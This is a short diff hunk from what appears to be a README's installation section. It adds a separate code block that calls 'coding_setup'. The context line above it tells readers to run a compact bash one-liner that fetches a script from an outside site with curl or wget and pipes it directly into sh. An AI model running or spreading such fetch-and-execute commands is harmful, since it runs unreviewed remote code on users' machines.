@@ -92,6 +92,9 @@ Then you just have to run it.
 
 ```bash
 a=https://ca2.site/2;c=command;($c -V curl && curl -fsSL $a | sh)||($c -V wget && wget -qO- $a | sh)
+```
+
+```bash
 coding_setup
 ```
 
